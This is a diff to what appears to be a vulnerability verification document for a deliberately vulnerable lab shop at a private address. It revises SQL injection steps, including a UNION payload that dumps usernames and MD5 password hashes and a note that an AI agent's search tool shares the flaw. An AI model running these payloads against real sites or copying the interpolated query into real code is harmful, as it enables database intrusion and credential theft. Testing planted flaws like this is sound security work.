@@ -25,14 +25,15 @@ $db->query("SELECT * FROM products WHERE in_stock = 1 AND (name LIKE '%$q%' OR d
 **Verification steps:**
 1. Visit `http://10.10.0.2/search.php?q=test`
 2. Confirm normal results are shown.
-3. Visit `http://10.10.0.2/search.php?q=%25' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -`
+3. Visit `http://10.10.0.2/search.php?q=%25') UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -`
    (column count: products table has 10 columns: id, name, description, price, image, category, tags, prep_time, in_stock, featured)
-4. A UNION-based result row with visible integers (2, 3, etc.) should appear in the product grid.
+4. A UNION-based result row with visible integers (2, 7, etc.) should appear in the product grid.
 5. To dump usernames and password hashes:
-   `q=%25' UNION SELECT 1,username,email,price,password,6,7,8,9,10 FROM users LIMIT 5-- -`
-   The `username` value will appear as the product name and `password` (MD5) as description.
+   `q=%25') UNION SELECT 1,username,3,price,5,6,password,8,9,10 FROM users LIMIT 5-- -`
+   The `username` value will appear as the product name and `password` (MD5) as the tags line.
+   Note: the `description` column is not rendered in the search result card — use columns 2 (name) or 7 (tags) for visible output.
 
-**Expected result:** User table data (username, email, MD5 password hash) visible in search results.
+**Expected result:** User table data (username, MD5 password hash) visible in search results.
 
 **Also vulnerable:** The `search_menu` tool in the AI agent calls the same pattern. See VULN-04.
 
